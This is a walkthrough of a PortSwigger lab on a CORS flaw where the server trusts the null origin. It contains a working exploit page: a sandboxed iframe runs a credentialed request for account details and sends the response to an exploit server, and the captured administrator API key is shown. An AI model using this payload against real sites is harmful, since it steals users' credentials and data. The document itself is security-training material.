# Lab: CORS vulnerability with trusted null origin
# https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-null-origin-whitelisted-attack

```bash
# Check user-details request again( we see Access-Control-Allow-Credentials again) and send to repeater.

# Try to add random website as origin and send the request.

Origin: http://random-website.com

# We don't see Access-Control-Allow-Origin at response so we need to try something else.
```

```bash
# Change the origin value to null.

Origin: null

# Response:

Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# This works.
```

```bash
# We will create similar payload to previous lab's payload.
# We will just add iframe to make origin null value.

<html>
	<body>
		
		<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
		<script>
		var xhr = new XMLHttpRequest();
		var url = 'https://0ab5006e04e27f2781f3701a001800e8.web-security-academy.net';
		xhr.open('GET', url + '/accountDetails', true);
		xhr.withCredentials = true;
		xhr.send();
		function xhrListener() {
			location = 'https://exploit-0ad7004d04547f79818d6f6e0123000a.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
		}
		xhr.onload = xhrListener;
		</script>"></iframe>
		
	</body>
</html>

```
```bash

# Deliver exploit to victim.

# Response:

"GET /log?key=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22gU4ZXSVA5ZFlAvf8G5ekN2boyuR4Lzst%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%22lS6WZ8Xc2yTQODavGFGkx0BZDXAQwpGT%22%0A%20%20%5D%0A%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

# Submit apikey part which is gU4ZXSVA5ZFlAvf8G5ekN2boyuR4Lzst.
```
